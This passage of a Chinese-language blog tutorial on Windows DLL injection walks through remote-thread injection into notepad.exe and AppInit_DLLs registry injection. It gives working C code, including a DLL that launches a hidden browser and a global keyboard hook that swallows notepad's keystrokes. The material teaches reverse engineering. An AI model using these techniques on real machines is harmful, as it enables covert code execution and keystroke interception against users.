class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>InjectDll()函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)</span><br></pre></td></tr></table></figure><p>调用OpenProcess API,借助程序运行时以参数形式传递过来的dwPID值，获取notepad.exe进程的句柄（PROCESS_ALL_ACCESS权限）。得到PROCESS_ALL_ACCESS权限后，就可以使用获取的句柄（hProcess ）控制对应进程</p><p>将要注入的DLL路径写入目标进程内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEMCOMMIT, PAGEREADWRITE);</span><br></pre></td></tr></table></figure><p>需要把即将加载的DLL文件的路径告知目标进程。因为任何内存空间都无法进行写入操作，故先使用VirtualAllocEx() API在目标进程的内存空间中分配一块缓冲区，且指定该缓冲区的大小为DLL文件路径字符串的长度（含Terminating NULL ）即可。</p><blockquote><p>VirtualAllocEx()函数的返回值（pRemoteBuf）为分配所得缓冲区的地址。该地址并不是程序（Inject.exe ）自身进程的内存地址，而是hProcess句柄所指目标进程（notepad.exe）的内存地址，请务必牢记这一点。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID) szDUName, dwBufSize, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>使用WriteProcessMemory() API将DLL路径字符串写入分配所得缓冲区（pRemoteBuf）地址。WriteProcessMemory API所写的内存空间也是hProcess句柄所指的目标进程的内存空间。</p><p>获取LoadLibraryW() API地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hMod = GetModuleHandle(<span class="string">&quot;kernel32 .dll&quot;</span>);</span><br><span class="line">pThreadProc = (LPTHREAD_STARTROUTINE)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br></pre></td></tr></table></figure><p>调用LoadLibrary() API前先要获取其地址（LoadLibraryW()是LoadLibrary()的Unicode字符串版本）。</p><p>最重要的是理解好以上代码的含义。我们的目标明明是获取加载到notepad.exe进程的kernel32.dll的LoadLibraryW() API的起始地址，但上面的代码却用来获取加载到InjectDll.exe进程的kernel32.dll的LoadLibraryW() API的起始地址。如果加载到notepad.exe进程中的kemel32.dll的地址与加载到InjectDll.exe进程中的kemel32.dll的地址相同，那么上面的代码就不会有什么问题。但是如果kemel32.dll在每个进程中加载的地址都不同，那么上面的代码就错了，执行时会发生内存引用错误。</p><p><strong>其实在Windows系统中，kernel32.dll在每个进程中的加载地址都是相同的。</strong></p><p>《Windows核心编程》一书中对此进行了介绍，此后这一特性被广泛应用于DLL注入技术。</p><p>为什么要去获取LoadLibraryW() API的起始地址?不能直接写代码调用嘛</p><p>不是在当前进程执行代码，而是让目标进程执行代码</p><p>当调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateRemoteThread(hProcess, ..., LoadLibraryW, pRemotePath, ...)</span><br></pre></td></tr></table></figure><p>在 <strong>notepad.exe</strong> 里面创建一个线程 让这个线程从 <code>LoadLibraryW</code> 地址开始执行</p><p>注意！这个线程是在,notepad.exe 的地址空间里执行而不是在,InjectDll.exe 的地址空间</p><p>LoadLibraryW(L”test.dll”);这只会发生在：InjectDll.exe 进程内部</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateRemoteThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE                 hProcess,</span></span><br><span class="line"><span class="params">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span><br><span class="line"><span class="params">  SIZE_T                 dwStackSize,</span></span><br><span class="line"><span class="params">  LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">  LPVOID                 lpParameter,</span></span><br><span class="line"><span class="params">  DWORD                  dwCreationFlags,</span></span><br><span class="line"><span class="params">  LPDWORD                lpThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>lpParameter：pRemoteBuf这个参数会作为：LoadLibraryW 的参数</p><p>除第一个参数hProcess外，其他参数与CreateThread()函数完全一样。hProcess参数是要执行线程的目标进程（或称远程进程、宿主进程）的句柄。IpStartAddress与IpParameter参数分别给出线程函数地址与线程参数地址。需要注意的是，这2个地址都应该在目标进程虚拟内存空间中。</p><blockquote><p>一般而言，DLL文件的ImageBase默认为0x10000000，依次加载a.dll与b.dll时，先加载的a.dll被正常加载到0x10000000地址处，后加载的b.dll无法再被加载到此，而是加载到其他空白地址空间，也就是说，该过程中发生了 DLL重定位（因为a.dll已经先被加载到它默认的地址处）。<br>若kemel32.dll加载到各个进程时地址各不相同，那么上述代码肯定是错误的。但实际在Windows操作系统中，kemel32.dll不管在哪个进程都会被加载至相同地址。为什么会这样呢？我借助PEView软件查看了 Windows操作系统的核心DLL文件的 ImageBase值，罗列如下表（Windows XP SP3版本，根据Windows更新不同，各值会有变化）。</p></blockquote><p>Windows 的做法是：</p><blockquote><p>给系统核心 DLL 预留固定地址 所有进程都映射到同一个虚拟地址， 这样就可以共享同一份物理内存页</p></blockquote><p><strong>kernel32.dll 是 Windows 提供基础系统功能的核心用户层 DLL。</strong></p><p>负责：进程管理 线程管理 内存管理 文件操作 控制台 同步机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CreateFile (kernel32)</span><br><span class="line">    ↓</span><br><span class="line">NtCreateFile (ntdll)</span><br><span class="line">    ↓</span><br><span class="line">系统调用</span><br><span class="line">    ↓</span><br><span class="line">ntoskrnl.exe</span><br></pre></td></tr></table></figure><p>在目标进程中运行远程线程（Remote Thread）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">pThreadProc = notepad.exe进程内存中的LoadLibrary()地址</span><br><span class="line">pRemoteBuf = notepad.exe进程内存中的 “c:\work\myhack.dll” 字符串地址</span><br></pre></td></tr></table></figure><p>一切准备就绪后，最后向notepad.exe发送一个命令，让其调用LoadLibraryW() API函数加载指定的DLL文件即可，遗憾的是Windows并未直接提供执行这一命令的API。但是我们可以另辟蹊径，使用CreateRemoteThread()这个API （在DLL注入时几乎总会用到）。</p><h2 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h2><p>进行DLL注入的第二种方法是使用注册表，WindowsOS的注册表中默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260216154158784.png" alt="image-20260216154158784"></p><p>只要将要注入DLL的路径写入AppInit_DLLs项目，并在LoadAppInit_DLLs中设置值为1，重启时，系统就会将指定的DLL注入到所有运行进程中。主要原理是User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，若值为1，就调用LoadLibrary()函数加载用户DLL。所以严格来说，是将注入DLL加载到使用user32.dll的进程中。</p><p>注：Windows XP会忽略LoadAppInit_DLLs注册表项。</p><blockquote><p><strong>User32.dll 是 Windows 提供图形界面和窗口管理的核心 DLL。</strong></p><p>负责：窗口 消息循环 键盘鼠标输入 对话框 按钮控件 消息机制</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// myhack2.cpp</span></span><br><span class="line"><span class="comment">// 主要作用是以隐藏模式运行IE，连接到指定网站</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_CMD  <span class="string">L&quot;c:\\Program Files\\Internet Explorer\\iexplore.exe&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_ADDR <span class="string">L&quot;http://www.naver.com&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_DST_PROC <span class="string">L&quot;notepad.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    TCHAR szCmd[MAX_PATH]  = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    TCHAR szPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    TCHAR *p = <span class="literal">NULL</span>;</span><br><span class="line">    STARTUPINFO si = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">        <span class="keyword">if</span>( !GetModuleFileName( <span class="literal">NULL</span>, szPath, MAX_PATH ) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( !(p = _tcsrchr(szPath, <span class="string">&#x27;\\&#x27;</span>)) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( _tcsicmp(p+<span class="number">1</span>, DEF_DST_PROC) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        wsprintf(szCmd, <span class="string">L&quot;%s %s&quot;</span>, DEF_CMD, DEF_ADDR);</span><br><span class="line">        <span class="keyword">if</span>( !CreateProcess(<span class="literal">NULL</span>, (LPTSTR)(LPCTSTR)szCmd, </span><br><span class="line">                            <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, </span><br><span class="line">                            NORMAL_PRIORITY_CLASS, </span><br><span class="line">                            <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( pi.hProcess != <span class="literal">NULL</span> )</span><br><span class="line">            CloseHandle(pi.hProcess);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>被注入的进程时64位，那么注入的DLL也应该是64位，32位对应32位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 将下面注册表的键对应的值设置为要注入的 DLL的路径</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs </span><br><span class="line"># 将下面注册表的键对应的值设置为 1</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs </span><br></pre></td></tr></table></figure><p>注入64位进程，应该修改的注册表键为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将下面注册表的键对应的值设置为要注入的 DLL的路径</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\WindowsNT\CurrentVersion\Windows\AppInit_DLLs</span><br><span class="line"><span class="comment"># 将下面注册表的键对应的值设置为 1</span></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\WindowsNT\CurrentVersion\Windows\LoadAppInit_DLLs</span><br></pre></td></tr></table></figure><h2 id="Windows消息钩取"><a href="#Windows消息钩取" class="headerlink" title="Windows消息钩取"></a>Windows消息钩取</h2><p><a href="https://www.cnblogs.com/Zer0o/p/17249259.html#%E8%B0%83%E8%AF%95main%E5%87%BD%E6%95%B0">DLL注入-Windows消息钩取 - Zer0o - 博客园</a></p><p>敲击键盘时，消息会从OS移动到应用程序，而<strong>消息钩子</strong>就是在这个过程中偷看信息</p><p><strong>常规Windows消息流：</strong></p><ol><li>发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]；</li><li>OS判断哪个应用程序中发生了事件，然后从[OS message queue]中取出消息，添加到相应应用程序的[application message queue]</li><li>应用程序监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应的事件处理程序处理。</li></ol><p>附带钩子的信息流：</p><ol><li>发生键盘输入事件，WM_KEYDOWN消息被添加到OS消息队列；</li><li>OS判断哪个应用程序发生了事件，从OS消息队列中取出消息，发送给应用程序；</li><li>钩子程序截取信息，对消息采取一定的动作（因钩子目的而定）；</li><li>如钩子程序不拦截消息，消息最终传输给应用程序，此时的消息可能经过了钩子程序的修改。</li></ol><p>SetWindowsHookEx()</p><p>在Windows中可以使用<a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">SetWindowsHookEx()API</a>来设置消息钩子，这个函数除了可以设置当前进程的钩子之外，它还可以设置全局钩子。全局钩子，顾名思义，即当前正在运行的进程都会被设置相应的钩子。</p><blockquote><p>Windows API作用类似是一个个功能函数。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK <span class="title">SetWindowsHookExA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="type">int</span>       idHook,      <span class="comment">//hook type 钩子类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">   HOOKPROC  lpfn,        <span class="comment">//hook procedure 回调函数地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">   HINSTANCE hMod,        <span class="comment">//hook procedure所属的dll句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">   DWORD     dwThreadId   <span class="comment">//想要挂钩的线程PID</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>第一个参数表征钩子的类型，但钩子的类型是微软规定好的，你只能选一种，自己不能乱写</p><p>第二个参数是钩子执行程序，即当钩子勾到所需信息时运行的程序</p><p>第三个参数是要注入的dll句柄</p><p>第四个参数是想要挂载的线程ID，如果该参数为0，则表明钩子是一个全局钩子</p><p>HHOOK：返回值，钩子句柄，需要保留，等不使用钩子时通过UnhookWindowsHookEx函数卸载钩子。</p><p>idHook：钩子的拦截消息类型，选择钩子程序的拦截范围，具体值参考文章结尾的消息类型。</p><p>Lpfn：消息的回调函数地址，钩子子程的地址指针，一般是填函数名。</p><p>hMod：钩子函数所在的实例的句柄。对于线程钩子，该参数为NULL；对于系统钩子，该参数为钩子函数所在的DLL句柄。在dll中可通过AfxInitExtensionModule(MousehookDLL, hInstance)获得DLL句柄。</p><p>dwThreadId：钩子所监视的线程的线程号，可通过GetCurrentThreadId()获得线程号。对于全局钩子，该参数为NULL(或0)。</p><p>使用SetWindowsHookEx()设置好钩子后，在某个进程中生成指定消息时，OS会将相关的DLL文件强制注入相应的进程，然后调用注册的钩子过程。</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260216175809205.png" alt="image-20260216175809205"></p><p>KeyHook.dll文件是一个含有钩子过程（KeyboardProc）的DLL文件，HookMain.exe是最先加载KeyHook.dll并安装键盘钩子的程序。HookMain.exe加载KeyHook.dll后使用SetWindowsHookEx()安装键盘钩子；若其他进程（如图中所示）发生键盘输入事件，OS就会强制将KeyHook.dll加载到像一个进程的内存，然后调用KeyboardProc()函数。</p><p>keyHook.cpp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//KeyHook.cpp</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义目标进程名为notepad.exe</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROCESS_NAME <span class="string">&quot;notepad.exe&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义全局变量</span></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//DllMain()函数在DLL被加载到进程后会自动执行</span></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span>&#123;</span><br><span class="line"><span class="keyword">switch</span>( dwReason )&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span>&#123;</span><br><span class="line"><span class="type">char</span> szPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"><span class="type">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( nCode &gt;= <span class="number">0</span> )&#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//释放键盘按键时，bit 31 : 0 =&gt; press, 1 =&gt; release</span></span><br><span class="line"><span class="keyword">if</span>(!(lParam &amp; <span class="number">0x80000000</span>) )&#123;</span><br><span class="line">GetModuleFileNameA(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">p = <span class="built_in">strrchr</span>(szPath, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序或下一个钩子函数</span></span><br><span class="line"><span class="comment">// _stricmp()函数用于比较字符串，i表示不区分大小写，若两个值相等则返回0</span></span><br><span class="line"><span class="keyword">if</span>( !_stricmp(p + <span class="number">1</span>, DEF_PROCESS_NAME) )&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//比较当前进程名称，若非notepad.exe，则消息传递给应用程序或下一个钩子函数</span></span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//在C++中调用C的库文件，用extern &quot;C&quot;告知编译器，因为C++支持函数重载而C不支持，两者的编译规则不同</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//__declspec，针对编译器的关键字，用于指出导出函数</span></span><br><span class="line"><span class="comment">//当调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链</span></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span>&#123;</span><br><span class="line">g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(g_hHook)&#123;</span><br><span class="line">UnhookWindowsHookEx(g_hHook);</span><br><span class="line">g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>因为要生成的是KeyHook.dll文件，因而在开始创建项目时应先选择Win 32控制台应用程序</p><p>当调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链。安装好键盘钩子后，无论哪个进程，只要发生键盘输入事件，OS都会强制将KeyHook.dll注入相应的进程中。</p><p>KeyboardProc()函数中发生键盘输入事件时，会比较当前进程名称和“notepad.exe”是否一致，若一致则返回1，终止KeyboardProc()函数，即截获并删除消息，从而实现对notepad.exe程序的键盘输入事件进行钩取并截获删除、键盘消息不能传递到notepad.exe的消息队列中。</p><p>KeyboardProc()函数定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">KeyboardProc</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">int</span> code,//HC_ACTION(<span class="number">0</span>)</span>, HC_NOREMOVE(<span class="number">3</span>)</span><br><span class="line">    WPARAM wParam,<span class="comment">//virtual-key code</span></span><br><span class="line">    LPARAM lParam<span class="comment">//extra information</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>其中wParam指用户按下的键盘按键的虚拟键值。</p><p>HookMain.cpp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HookMain</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="comment">//Console Input/Output，定义了通过控制台进行数据输入和数据输出的函数</span></span><br><span class="line"><span class="comment">//主要是一些用户通过按键盘产生的对应操作，比如getch()函数等等</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;conio.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义一些常量</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_DLL_NAME <span class="string">&quot;KeyHook.dll&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_HOOKSTART <span class="string">&quot;HookStart&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_HOOKSTOP <span class="string">&quot;HookStop&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//定义两个参数为空、返回值为void即没有的函数指针</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//定义及初始化句柄变量和函数指针</span></span><br><span class="line">HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">PFN_HOOKSTART HookStart = <span class="literal">NULL</span>;</span><br><span class="line">PFN_HOOKSTOP HookStop = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//加载KeyHook.dll</span></span><br><span class="line">hDll = LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//若加载不成功，则输出错误信息</span></span><br><span class="line"><span class="keyword">if</span>( hDll == <span class="literal">NULL</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]无法加载%s [%d]\n&quot;</span>, DEF_DLL_NAME, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//获取导出函数地址</span></span><br><span class="line">HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, 